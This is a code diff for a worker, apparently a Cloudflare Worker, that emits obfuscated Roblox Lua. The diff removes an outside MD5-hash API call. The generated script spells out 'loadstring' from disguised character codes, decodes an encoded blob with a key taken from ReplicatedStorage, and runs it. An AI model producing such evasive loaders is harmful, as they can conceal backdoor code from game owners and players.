@@ -146,13 +146,6 @@ function GetNumberWithMath(num) {
   return expr;
 }
 
-// Encode Hash Code 'Md5' Function
-async function EncodeHashCode(str) {
-  const response = await fetch(`https://api.hashify.net/hash/md5/hex?value=${encodeURIComponent(str)}`);
-  const data = await response.json();
-  return data.Digest;
-}
-
 
 export default {
   async fetch(request, env, ctx) {
@@ -211,10 +204,9 @@ export default {
       const date = new Date();
       const pad = n => n.toString().padStart(2, '0');
       const time = `${date.getFullYear()}${pad(date.getMonth() + 1)}${pad(date.getDate())}${pad(date.getHours())}${pad(date.getMinutes())}${pad(date.getSeconds())}`;
-      const hash = await EncodeHashCode(time);
       const script = `
-      print("${hash}", "${time}")
-      print(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.hashify.net/hash/md5/hex?value="..os.date("%Y%m%d%H%M")..string.format("%02d", (tonumber(os.date("%S")) + 1) % 60))).Digest, os.date("%Y%m%d%H%M")..string.format("%02d", (tonumber(os.date("%S")) + 1) % 60))
+      print("${time}")
+      print(os.date("%Y%m%d%H%M")..string.format("%02d", (tonumber(os.date("%S")) + 1) % 60))
       local function ${decodedStr}(encodedStr, key) local result = {} local parts = string.split(encodedStr, "/") for i = 1, #parts do local byte = tonumber(parts[i]) local k = key:byte(((i - 1) % #key) + 1) local decoded = (byte - k + 256) % 256 table.insert(result, string.char(decoded)) end return table.concat(result) end 
       local a = game local b = "GetService" local c = "ReplicatedStorage" local d = "Destroy" local ${objStr} = a[b](a, c)["${data.Name}"].Value
       local ${fnStr}="";for _, c in ipairs({${GetNumberWithMath(108)}, ${GetNumberWithMath(111)}, ${GetNumberWithMath(97)}, ${GetNumberWithMath(100)}, ${GetNumberWithMath(115)}, ${GetNumberWithMath(116)}, ${GetNumberWithMath(114)}, ${GetNumberWithMath(105)}, ${GetNumberWithMath(110)}, ${GetNumberWithMath(103)}}) do ${fnStr}=${fnStr}..string.char(c);end(getfenv()[${fnStr}] or _G[${fnStr}] or _ENV and _ENV[${fnStr}])(${decodedStr}("${encoded}", ${objStr}))()`;
